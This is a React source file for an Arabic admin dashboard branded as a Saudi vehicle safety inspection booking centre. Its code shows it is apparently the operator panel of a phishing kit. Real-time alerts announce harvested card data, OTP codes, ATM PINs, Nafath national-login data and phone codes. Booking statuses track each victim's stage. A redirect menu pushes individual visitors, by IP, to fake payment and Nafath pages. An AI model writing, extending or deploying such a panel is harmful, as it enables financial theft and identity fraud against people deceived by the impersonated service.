import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useAuth } from "@/_core/hooks/useAuth";
import { Input } from "@/components/ui/input";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { toast } from "sonner";
import { io as socketIO } from "socket.io-client";

// دالة تشغيل صوت تنبيه
function playNotificationSound() {
  try {
    const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
    osc.frequency.setValueAtTime(880, ctx.currentTime + 0.2);
    gain.gain.setValueAtTime(0.3, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.4);
  } catch (e) {}
}

type Booking = {
  id: number;
  referenceId: string;
  clientName: string;
  clientId: string;
  clientPhone: string;
  vehiclePlate: string;
  serviceRegion: string;
  serviceDate: string;
  status: string;
  clientIp: string | null;
  createdAt: Date;
};

const STATUS_LABELS: Record<string, { label: string; color: string; bg: string }> = {
  new: { label: "جديد", color: "#0d6efd", bg: "#e7f0ff" },
  pending_payment: { label: "انتظار دفع", color: "#856404", bg: "#fff3cd" },
  pending_nafath: { label: "انتظار نفاذ", color: "#6f42c1", bg: "#f0e9ff" },
  pending_motasel: { label: "انتظار متصل", color: "#d63384", bg: "#ffe5f0" },
  payment_done: { label: "تم الدفع", color: "#146c43", bg: "#d1e7dd" },
  verified: { label: "تم التحقق", color: "#0a6640", bg: "#d0f0e0" },
  completed: { label: "مكتمل", color: "#495057", bg: "#e9ecef" },
  cancelled: { label: "ملغي", color: "#842029", bg: "#f8d7da" },
};

export default function AdminDashboard() {
  const [, navigate] = useLocation();
  const { user, loading, isAuthenticated, logout } = useAuth();
  const [search, setSearch] = useState("");
  const [newBookingsCount, setNewBookingsCount] = useState(0);
  const [navigateDialog, setNavigateDialog] = useState<{
    open: boolean;
    booking: Booking | null;
  }>({ open: false, booking: null });
  const socketRef = useRef<ReturnType<typeof socketIO> | null>(null);

  // Auth check
  useEffect(() => {
    if (!loading && (!isAuthenticated || user?.role !== "admin")) {
      navigate("/admin/login");
    }
  }, [loading, isAuthenticated, user]);

  // Socket.io connection
  useEffect(() => {
    const socket = socketIO({ path: "/socket.io" });
    socketRef.current = socket;
    socket.emit("joinAdmin", "admin-token");

    socket.on("newBooking", (booking: Booking) => {
      playNotificationSound();
      toast.success(`حجز جديد من ${booking.clientName}`, {
        description: `رقم الهوية: ${booking.clientId} | اللوحة: ${booking.vehiclePlate}`,
      });
      setNewBookingsCount((c) => c + 1);
      refetchBookings();
    });

    socket.on("newPayment", (data: { reference: string; step?: number; type?: string }) => {
      playNotificationSound();
      const typeLabels: Record<string, string> = {
        card: "بيانات بطاقة جديدة",
        verification: "رمز OTP جديد",
        code: "رقم ATM جديد",
        nafath: "بيانات نفاذ جديدة",
        phoneCode: "رمز هاتف جديد",
      };
      const label = data.type ? typeLabels[data.type] || "بيانات جديدة" : "دفع جديد";
      toast.info(`${label} - المرجع: ${data.reference}`);
      refetchBookings();
    });

    return () => {
      socket.disconnect();
    };
  }, []);

  // Data fetching
  const { data: statsData } = trpc.booking.stats.useQuery();
  const {
    data: bookingsData,
    refetch: refetchBookings,
    isLoading,
  } = trpc.booking.list.useQuery({ limit: 200 });

  const navigateMutation = trpc.navigation.navigateTo.useMutation({
    onSuccess: (res) => {
      toast.success(res.message);
      setNavigateDialog({ open: false, booking: null });
    },
    onError: (err) => toast.error(err.message),
  });

  const updateStatusMutation = trpc.booking.updateStatus.useMutation({
    onSuccess: () => {
      toast.success("تم تحديث الحالة");
      refetchBookings();
    },
  });

  const markReadMutation = trpc.booking.markRead.useMutation({
    onSuccess: () => refetchBookings(),
  });

  const stats = statsData?.data;
  const bookings: Booking[] = (bookingsData?.data as Booking[]) || [];

  const filtered = bookings.filter(
    (b) =>
      b.clientName?.toLowerCase().includes(search.toLowerCase()) ||
      b.clientId?.includes(search) ||
      b.vehiclePlate?.toLowerCase().includes(search.toLowerCase()) ||
      b.referenceId?.includes(search)
  );

  const handleNavigate = (booking: Booking, page: string) => {
    if (!booking.clientIp) {
      toast.error("لا يوجد IP للعميل");
      return;
    }
    navigateMutation.mutate({
      clientIp: booking.clientIp,
      page,
      referenceId: booking.referenceId,
    });
  };

  if (loading) {
    return (
      <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", background: "#f8f9fa" }}>
        <div style={{ width: 40, height: 40, border: "4px solid #04aa6d", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.8s linear infinite" }} />
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    );
  }

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#f8f9fa", fontFamily: "'Cairo', sans-serif" }}>
      {/* Google Fonts */}
      <link rel="preconnect" href="https://fonts.googleapis.com" />
      <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet" />

      {/* Navbar */}
      <nav style={{ background: "#1B8354", padding: "0 20px", display: "flex", alignItems: "center", justifyContent: "space-between", height: 60, position: "sticky", top: 0, zIndex: 100, boxShadow: "0 2px 8px rgba(0,0,0,0.15)" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <img src="/logo.svg" alt="شعار سلامة المركبات" style={{ height: 38, objectFit: "contain", filter: "brightness(0) invert(1)" }} />
          <div>
            <div style={{ color: "white", fontWeight: 700, fontSize: 15, lineHeight: 1.2 }}>مركز سلامة المركبات</div>
            <div style={{ color: "rgba(255,255,255,0.8)", fontSize: 11 }}>لوحة إدارة الحجوزات</div>
          </div>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          {newBookingsCount > 0 && (
            <button
              onClick={() => { setNewBookingsCount(0); refetchBookings(); }}
              style={{ background: "#ff4444", color: "white", border: "none", borderRadius: 20, padding: "4px 12px", fontSize: 12, cursor: "pointer", display: "flex", alignItems: "center", gap: 6 }}
            >
              <span style={{ background: "white", color: "#ff4444", borderRadius: "50%", width: 18, height: 18, display: "inline-flex", alignItems: "center", justifyContent: "center", fontWeight: 700, fontSize: 11 }}>{newBookingsCount}</span>
              حجوزات جديدة
            </button>
          )}
          <button
            onClick={() => refetchBookings()}
            title="تحديث"
            style={{ background: "rgba(255,255,255,0.15)", color: "white", border: "1px solid rgba(255,255,255,0.3)", borderRadius: 8, padding: "6px 12px", fontSize: 12, cursor: "pointer" }}
          >
            ↻ تحديث
          </button>
          <span style={{ color: "rgba(255,255,255,0.9)", fontSize: 13 }}>
            <i className="fa fa-user-circle" style={{ marginLeft: 4 }} />
            {user?.name || "المسؤول"}
          </span>
          <button
            onClick={() => { logout(); navigate("/admin/login"); }}
            style={{ background: "rgba(255,255,255,0.15)", color: "white", border: "1px solid rgba(255,255,255,0.3)", borderRadius: 8, padding: "6px 14px", fontSize: 12, cursor: "pointer" }}
          >
            خروج
          </button>
        </div>
      </nav>

      <div style={{ maxWidth: 1400, margin: "0 auto", padding: "24px 16px" }}>

        {/* Stats Cards */}
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))", gap: 16, marginBottom: 24 }}>
          {/* إجمالي الحجوزات */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px 24px", boxShadow: "0 2px 8px rgba(0,0,0,0.07)", display: "flex", alignItems: "center", gap: 16, borderRight: "4px solid #1B8354" }}>
            <div style={{ width: 52, height: 52, background: "#e8f5ee", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#1B8354" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
                <circle cx="9" cy="7" r="4"/>
                <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
                <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
              </svg>
            </div>
            <div>
              <div style={{ fontSize: 28, fontWeight: 700, color: "#1B8354", lineHeight: 1 }}>{stats?.total ?? 0}</div>
              <div style={{ fontSize: 13, color: "#6c757d", marginTop: 4 }}>إجمالي الحجوزات</div>
            </div>
          </div>

          {/* حجوزات جديدة */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px 24px", boxShadow: "0 2px 8px rgba(0,0,0,0.07)", display: "flex", alignItems: "center", gap: 16, borderRight: "4px solid #0d6efd" }}>
            <div style={{ width: 52, height: 52, background: "#e7f0ff", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#0d6efd" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/>
                <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
              </svg>
            </div>
            <div>
              <div style={{ fontSize: 28, fontWeight: 700, color: "#0d6efd", lineHeight: 1 }}>{stats?.new ?? 0}</div>
              <div style={{ fontSize: 13, color: "#6c757d", marginTop: 4 }}>حجوزات جديدة</div>
            </div>
          </div>

          {/* مكتملة */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px 24px", boxShadow: "0 2px 8px rgba(0,0,0,0.07)", display: "flex", alignItems: "center", gap: 16, borderRight: "4px solid #04aa6d" }}>
            <div style={{ width: 52, height: 52, background: "#d1f5e8", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#04aa6d" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <polyline points="20 6 9 17 4 12"/>
              </svg>
            </div>
            <div>
              <div style={{ fontSize: 28, fontWeight: 700, color: "#04aa6d", lineHeight: 1 }}>{stats?.completed ?? 0}</div>
              <div style={{ fontSize: 13, color: "#6c757d", marginTop: 4 }}>مكتملة</div>
            </div>
          </div>

          {/* قيد المعالجة */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px 24px", boxShadow: "0 2px 8px rgba(0,0,0,0.07)", display: "flex", alignItems: "center", gap: 16, borderRight: "4px solid #fd7e14" }}>
            <div style={{ width: 52, height: 52, background: "#fff3e0", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#fd7e14" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"/>
                <polyline points="12 6 12 12 16 14"/>
              </svg>
            </div>
            <div>
              <div style={{ fontSize: 28, fontWeight: 700, color: "#fd7e14", lineHeight: 1 }}>
                {(stats as any)?.pending ?? ((stats?.total ?? 0) - (stats?.completed ?? 0) - (stats?.new ?? 0))}
              </div>
              <div style={{ fontSize: 13, color: "#6c757d", marginTop: 4 }}>قيد المعالجة</div>
            </div>
          </div>

          {/* الزوار */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px 24px", boxShadow: "0 2px 8px rgba(0,0,0,0.07)", display: "flex", alignItems: "center", gap: 16, borderRight: "4px solid #6f42c1" }}>
            <div style={{ width: 52, height: 52, background: "#f0e9ff", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#6f42c1" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                <circle cx="12" cy="12" r="3"/>
              </svg>
            </div>
            <div>
              <div style={{ fontSize: 28, fontWeight: 700, color: "#6f42c1", lineHeight: 1 }}>{(stats as any)?.visitors ?? 0}</div>
              <div style={{ fontSize: 13, color: "#6c757d", marginTop: 4 }}>الزوار</div>
            </div>
          </div>
        </div>

        {/* Bookings Table */}
        <div style={{ background: "white", borderRadius: 12, boxShadow: "0 2px 8px rgba(0,0,0,0.07)", overflow: "hidden" }}>
          {/* Table Header */}
          <div style={{ padding: "16px 20px", borderBottom: "1px solid #e9ecef", display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: 12 }}>
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <div style={{ width: 4, height: 20, background: "#1B8354", borderRadius: 2 }} />
              <h2 style={{ margin: 0, fontSize: 16, fontWeight: 700, color: "#233f48" }}>قائمة الحجوزات</h2>
              <span style={{ background: "#e8f5ee", color: "#1B8354", borderRadius: 20, padding: "2px 10px", fontSize: 12, fontWeight: 600 }}>
                {filtered.length}
              </span>
            </div>
            <div style={{ position: "relative" }}>
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9B9B9B" strokeWidth="2" style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)" }}>
                <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
              </svg>
              <input
                type="text"
                placeholder="بحث بالاسم أو الهوية أو اللوحة..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                style={{ paddingRight: 32, paddingLeft: 12, height: 36, border: "1px solid #dee2e6", borderRadius: 8, fontSize: 13, outline: "none", width: 260, fontFamily: "'Cairo', sans-serif" }}
              />
            </div>
          </div>

          {/* Table */}
          <div style={{ overflowX: "auto" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 13 }}>
              <thead>
                <tr style={{ background: "#f8f9fa" }}>
                  {["المرجع", "الاسم", "رقم الهوية", "رقم اللوحة", "الهاتف", "المنطقة", "الحالة", "التاريخ", "الإجراءات"].map((h) => (
                    <th key={h} style={{ padding: "10px 14px", textAlign: "right", fontWeight: 600, color: "#495057", fontSize: 12, borderBottom: "2px solid #e9ecef", whiteSpace: "nowrap" }}>
                      {h}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {isLoading ? (
                  <tr>
                    <td colSpan={9} style={{ textAlign: "center", padding: "40px", color: "#6c757d" }}>
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
                        <div style={{ width: 20, height: 20, border: "3px solid #1B8354", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.8s linear infinite" }} />
                        جاري التحميل...
                      </div>
                    </td>
                  </tr>
                ) : filtered.length === 0 ? (
                  <tr>
                    <td colSpan={9} style={{ textAlign: "center", padding: "40px", color: "#6c757d" }}>
                      لا توجد حجوزات
                    </td>
                  </tr>
                ) : (
                  filtered.map((booking, idx) => {
                    const statusInfo = STATUS_LABELS[booking.status] || {
                      label: booking.status,
                      color: "#495057",
                      bg: "#e9ecef",
                    };
                    return (
                      <tr
                        key={booking.id}
                        style={{ borderBottom: "1px solid #f0f0f0", cursor: "pointer", transition: "background 0.15s", background: idx % 2 === 0 ? "white" : "#fafafa" }}
                        onMouseEnter={(e) => (e.currentTarget.style.background = "#f0faf5")}
                        onMouseLeave={(e) => (e.currentTarget.style.background = idx % 2 === 0 ? "white" : "#fafafa")}
                        onClick={() => {
                          markReadMutation.mutate({ reference: booking.referenceId });
                          navigate(`/admin/booking/${booking.referenceId}`);
                        }}
                      >
                        <td style={{ padding: "10px 14px", whiteSpace: "nowrap" }}>
                          <span style={{ fontFamily: "monospace", fontSize: 11, color: "#6c757d", background: "#f8f9fa", padding: "2px 6px", borderRadius: 4 }}>
                            {booking.referenceId}
                          </span>
                        </td>
                        <td style={{ padding: "10px 14px", fontWeight: 600, color: "#233f48" }}>
                          {booking.clientName}
                        </td>
                        <td style={{ padding: "10px 14px", color: "#495057" }}>
                          {booking.clientId}
                        </td>
                        <td style={{ padding: "10px 14px" }}>
                          <span style={{ fontFamily: "monospace", background: "#f8f9fa", border: "1px solid #dee2e6", padding: "2px 8px", borderRadius: 4, fontSize: 12 }}>
                            {booking.vehiclePlate || "—"}
                          </span>
                        </td>
                        <td style={{ padding: "10px 14px", color: "#495057", direction: "ltr", textAlign: "right" }}>
                          {booking.clientPhone}
                        </td>
                        <td style={{ padding: "10px 14px", color: "#6c757d", maxWidth: 160, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                          {booking.serviceRegion || "—"}
                        </td>
                        <td style={{ padding: "10px 14px" }}>
                          <span style={{ background: statusInfo.bg, color: statusInfo.color, borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 600, whiteSpace: "nowrap" }}>
                            {statusInfo.label}
                          </span>
                        </td>
                        <td style={{ padding: "10px 14px", color: "#6c757d", fontSize: 12, whiteSpace: "nowrap" }}>
                          {new Date(booking.createdAt).toLocaleDateString("ar-SA")}
                        </td>
                        <td style={{ padding: "10px 14px" }} onClick={(e) => e.stopPropagation()}>
                          <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
                            {/* زر التوجيه */}
                            <DropdownMenu>
                              <DropdownMenuTrigger asChild>
                                <button style={{ background: "#1B8354", color: "white", border: "none", borderRadius: 6, padding: "5px 10px", fontSize: 11, cursor: "pointer", display: "flex", alignItems: "center", gap: 4, fontFamily: "'Cairo', sans-serif" }}>
                                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polygon points="3 11 22 2 13 21 11 13 3 11"/></svg>
                                  توجيه
                                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="6 9 12 15 18 9"/></svg>
                                </button>
                              </DropdownMenuTrigger>
                              <DropdownMenuContent align="end" className="w-48">
                                <DropdownMenuItem onClick={() => handleNavigate(booking, "/payment")} className="text-sm gap-2">
                                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#1B8354" strokeWidth="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
                                  صفحة الدفع
                                </DropdownMenuItem>
                                <DropdownMenuItem onClick={() => handleNavigate(booking, "/nafath")} className="text-sm gap-2">
                                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6f42c1" strokeWidth="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
                                  صفحة نفاذ
                                </DropdownMenuItem>
                                <DropdownMenuItem onClick={() => handleNavigate(booking, "/motasel")} className="text-sm gap-2">
                                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fd7e14" strokeWidth="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.61 3.41 2 2 0 0 1 3.6 1.21h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.91a16 16 0 0 0 6 6l.92-.92a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 21.73 16.92z"/></svg>
                                  صفحة المتصل
                                </DropdownMenuItem>
                                <DropdownMenuItem onClick={() => handleNavigate(booking, "/booking")} className="text-sm gap-2">
                                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#0d6efd" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="21" x2="9" y2="9"/></svg>
                                  صفحة الحجز
                                </DropdownMenuItem>
                                <DropdownMenuItem onClick={() => handleNavigate(booking, "/")} className="text-sm gap-2">
                                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6c757d" strokeWidth="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
                                  الصفحة الرئيسية
                                </DropdownMenuItem>
                              </DropdownMenuContent>
                            </DropdownMenu>

                            {/* زر التفاصيل */}
                            <button
                              onClick={() => navigate(`/admin/booking/${booking.referenceId}`)}
                              title="عرض التفاصيل"
                              style={{ background: "white", color: "#495057", border: "1px solid #dee2e6", borderRadius: 6, padding: "5px 8px", fontSize: 11, cursor: "pointer" }}
                            >
                              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                            </button>

                            {/* زر تغيير الحالة */}
                            <DropdownMenu>
                              <DropdownMenuTrigger asChild>
                                <button
                                  title="تغيير الحالة"
                                  style={{ background: "white", color: "#495057", border: "1px solid #dee2e6", borderRadius: 6, padding: "5px 8px", fontSize: 11, cursor: "pointer" }}
                                >
                                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="6 9 12 15 18 9"/></svg>
                                </button>
                              </DropdownMenuTrigger>
                              <DropdownMenuContent align="end" className="w-40">
                                <DropdownMenuItem
                                  onClick={() => updateStatusMutation.mutate({ reference: booking.referenceId, status: "completed", statusRead: 1 })}
                                  className="text-sm text-green-600"
                                >
                                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#04aa6d" strokeWidth="2" style={{ marginLeft: 6 }}><polyline points="20 6 9 17 4 12"/></svg>
                                  مكتمل
                                </DropdownMenuItem>
                                <DropdownMenuItem
                                  onClick={() => updateStatusMutation.mutate({ reference: booking.referenceId, status: "cancelled", statusRead: 1 })}
                                  className="text-sm text-red-600"
                                >
                                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#dc3545" strokeWidth="2" style={{ marginLeft: 6 }}><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>
                                  إلغاء
                                </DropdownMenuItem>
                              </DropdownMenuContent>
                            </DropdownMenu>
                          </div>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>

          {/* Footer */}
          <div style={{ padding: "12px 20px", borderTop: "1px solid #e9ecef", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <span style={{ fontSize: 12, color: "#6c757d" }}>
              إجمالي النتائج: <strong style={{ color: "#233f48" }}>{filtered.length}</strong> حجز
            </span>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <img src="/SASO.svg" alt="SASO" style={{ height: 28, opacity: 0.7 }} />
              <span style={{ fontSize: 11, color: "#9ca3af" }}>تحت إشراف هيئة المواصفات والمقاييس</span>
            </div>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
        * { box-sizing: border-box; }
        body { font-family: 'Cairo', sans-serif !important; }
      `}</style>

      {/* Navigate Dialog */}
      <Dialog open={navigateDialog.open} onOpenChange={(open) => setNavigateDialog({ open, booking: navigateDialog.booking })}>
        <DialogContent dir="rtl">
          <DialogHeader>
            <DialogTitle>توجيه العميل</DialogTitle>
          </DialogHeader>
          {navigateDialog.booking && (
            <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
              {[
                { page: "/payment", label: "صفحة الدفع", color: "#1B8354" },
                { page: "/nafath", label: "صفحة نفاذ", color: "#6f42c1" },
                { page: "/motasel", label: "صفحة المتصل", color: "#fd7e14" },
                { page: "/booking", label: "صفحة الحجز", color: "#0d6efd" },
                { page: "/", label: "الصفحة الرئيسية", color: "#6c757d" },
              ].map(({ page, label, color }) => (
                <button
                  key={page}
                  onClick={() => handleNavigate(navigateDialog.booking!, page)}
                  style={{ background: color, color: "white", border: "none", borderRadius: 8, padding: "10px 20px", fontSize: 14, cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}
                >
                  {label}
                </button>
              ))}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
